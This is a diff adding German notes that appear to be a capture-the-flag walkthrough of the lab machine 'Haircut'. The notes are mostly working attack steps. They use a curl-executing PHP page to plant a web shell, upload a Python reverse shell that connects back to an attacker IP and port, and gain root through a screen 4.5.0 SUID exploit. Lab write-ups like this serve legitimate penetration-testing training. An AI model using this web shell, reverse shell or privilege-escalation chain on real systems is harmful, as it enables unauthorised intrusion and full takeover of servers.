@@ -1,0 +1,40 @@
+Haircut
+=================
+Kurzbeschreibung
+-------------------
+- Exploit Curl
+- Exploit Screen 4.5.0 (#41154) 
+-------------------
+- 22 SSH
+- 80 nginx
+- nikto
+   => nginx 1.10.0 
+   =>/test.html
+- dirb 
+   => /uploads 
+   => exposed.php
+- test.html
+   => carrie.jpg ("carrie curl")
+- exposed.php
+   => führt Curl aus
+   => "http://localhost/test.html -o ./uploads/test.txt" (Speichern von Curl-Output in Upload-Folder möglich)
+- test.txt:
+   <?php system($_GET['cmd']); ?>
+- Upload "http://<IP>/test.txt -o ./uploads/test.php"
+- curl http://haircut.htb/uploads/test.php?cmd='cat /home/maria/Desktop/user.txt'
+- Upload einer Python Reverse Shell:
+---------------------------------------------------
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("<IP>",<PORT>));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+---------------------------------------------------
+- Starten der Shell über test.php aus Upload-Folder
+  curl http://haircut.htb/uploads/test.php?cmd='python3 /var/www/html/uploads/shell.py'
+- Upgrade der Shell: python3 -c "import pty;pty.spawn('/bin/bash')";
+- SUID-Files: screen 4.5.0 
+   => Exploit 41154 (libhax.so und rootshell wie im Script angeführt lokal kompilieren und hochladen)
+- cat /root/root.txt
